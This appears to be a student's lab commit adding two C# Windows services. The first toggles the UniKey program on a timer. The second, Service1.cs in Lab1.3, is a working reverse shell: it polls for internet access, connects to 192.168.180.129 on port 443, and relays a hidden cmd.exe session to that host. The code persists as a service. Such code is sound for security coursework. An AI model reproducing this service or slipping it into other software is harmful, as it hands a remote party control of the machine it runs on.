74be9d78d42f974289a9708701a76657ab1a4afa
oadmino <81947451+oadmino@users.noreply.github.com>
2021-04-05 18:54:31 +0700

    Lab1

---
+++ 18520020_Lab1.2/Service1.cs
@@ -0,0 +1,81 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Linq;
+using System.ServiceProcess;
+using System.Text;
+using System.Threading.Tasks;
+using System.Timers;
+using System.IO;
+
+namespace _18520020_Lab1._2
+{
+    public partial class Service1 : ServiceBase
+    {
+        Timer timer = new Timer();
+        public Service1()
+        {
+            InitializeComponent();
+        }
+
+        protected override void OnStart(string[] args)
+        {
+            WriteToFile("Service is started at " + DateTime.Now);
+            timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
+            timer.Interval = 5000;
+            timer.Enabled = true;
+        }
+
+        protected override void OnStop()
+        {
+            WriteToFile("Service is stopped at " + DateTime.Now);
+        }
+
+        private void OnElapsedTime(object source, ElapsedEventArgs e)
+        {
+            WriteToFile("Service recall at " + DateTime.Now);
+            Process[] name = Process.GetProcessesByName("UniKeyNT");
+            if (name.Length == 0)
+            {
+                WriteToFile("UniKey is OFF");
+                WriteToFile("Turn on in 5 secs");
+                Process.Start("C:/Program Files/UniKey/UniKeyNT.exe");
+            }
+            else
+            {
+                WriteToFile("UniKey is ON");
+                WriteToFile("Turn off in 5 secs");
+                foreach (var p in Process.GetProcessesByName("UniKeyNT"))
+                {
+                    p.Kill();
+                }
+            }
+        }
+
+        public void WriteToFile(string Message)
+        {
+            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
+            if (!Directory.Exists(path))
+            {
+                Directory.CreateDirectory(path);
+            }
+            string filepath = AppDomain.CurrentDomain.BaseDirectory + "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') + ".txt";
+            if (!File.Exists(filepath))
+            {
+                using (StreamWriter sw = File.CreateText(filepath))
+                {
+                    sw.WriteLine(Message);
+                }
+            }
+            else
+            {
+                using (StreamWriter sw = File.AppendText(filepath))
+                {
+                    sw.WriteLine(Message);
+                }
+            }
+        }
+    }
+}
---
+++ 18520020_Lab1.3/Service1.cs
@@ -0,0 +1,142 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Linq;
+using System.ServiceProcess;
+using System.Text;
+using System.Threading.Tasks;
+using System.Timers;
+using System.IO;
+using System.Net.NetworkInformation;
+using System.Net.Sockets;
+
+namespace _18520020_Lab1._3
+{
+    public partial class Service1 : ServiceBase
+    {
+        Timer timer = new Timer();
+        public Service1()
+        {
+            InitializeComponent();
+        }
+
+        protected override void OnStart(string[] args)
+        {
+            WriteToFile("Service is started at " + DateTime.Now);
+            timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
+            timer.Interval = 5000;
+            timer.Enabled = true;
+        }
+
+        protected override void OnStop()
+        {
+            WriteToFile("Service is stopped at " + DateTime.Now);
+        }
+
+        public static bool CheckForInternetConnection()
+        {
+            try
+            {
+                using (var client = new System.Net.WebClient())
+                using (client.OpenRead("http://google.com"))
+                    return true;
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
+        static StreamWriter streamWriter;
+
+        public static void ReverseShell()
+        {
+            using (TcpClient client = new TcpClient("192.168.180.129", 443))
+            {
+                using (Stream stream = client.GetStream())
+                {
+                    using (StreamReader rdr = new StreamReader(stream))
+                    {
+                        streamWriter = new StreamWriter(stream);
+
+                        StringBuilder strInput = new StringBuilder();
+
+                        Process p = new Process();
+                        p.StartInfo.FileName = "cmd.exe";
+                        p.StartInfo.CreateNoWindow = true;
+                        p.StartInfo.UseShellExecute = false;
+                        p.StartInfo.RedirectStandardOutput = true;
+                        p.StartInfo.RedirectStandardInput = true;
+                        p.StartInfo.RedirectStandardError = true;
+                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+                        p.Start();
+                        p.BeginOutputReadLine();
+
+                        while (true)
+                        {
+                            strInput.Append(rdr.ReadLine());
+                            //strInput.Append("\n");
+                            p.StandardInput.WriteLine(strInput);
+                            strInput.Remove(0, strInput.Length);
+                        }
+                    }
+                }
+            }
+        }
+
+        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        {
+            StringBuilder strOutput = new StringBuilder();
+
+            if (!String.IsNullOrEmpty(outLine.Data))
+            {
+                try
+                {
+                    strOutput.Append(outLine.Data);
+                    streamWriter.WriteLine(strOutput);
+                    streamWriter.Flush();
+                }
+                catch (Exception err) { }
+            }
+        }
+        private void OnElapsedTime(object source, ElapsedEventArgs e)
+        {
+            WriteToFile("Service recall at " + DateTime.Now);
+           if (CheckForInternetConnection() == true)
+            {
+                WriteToFile("Connected to Internet");
+                ReverseShell();
+            }    
+           else
+            {
+                WriteToFile("Disconnected to Internet");
+            }    
+        }
+
+        public void WriteToFile(string Message)
+        {
+            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
+            if (!Directory.Exists(path))
+            {
+                Directory.CreateDirectory(path);
+            }
+            string filepath = AppDomain.CurrentDomain.BaseDirectory + "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') + ".txt";
+            if (!File.Exists(filepath))
+            {
+                using (StreamWriter sw = File.CreateText(filepath))
+                {
+                    sw.WriteLine(Message);
+                }
+            }
+            else
+            {
+                using (StreamWriter sw = File.AppendText(filepath))
+                {
+                    sw.WriteLine(Message);
+                }
+            }
+        }
+    }
+}
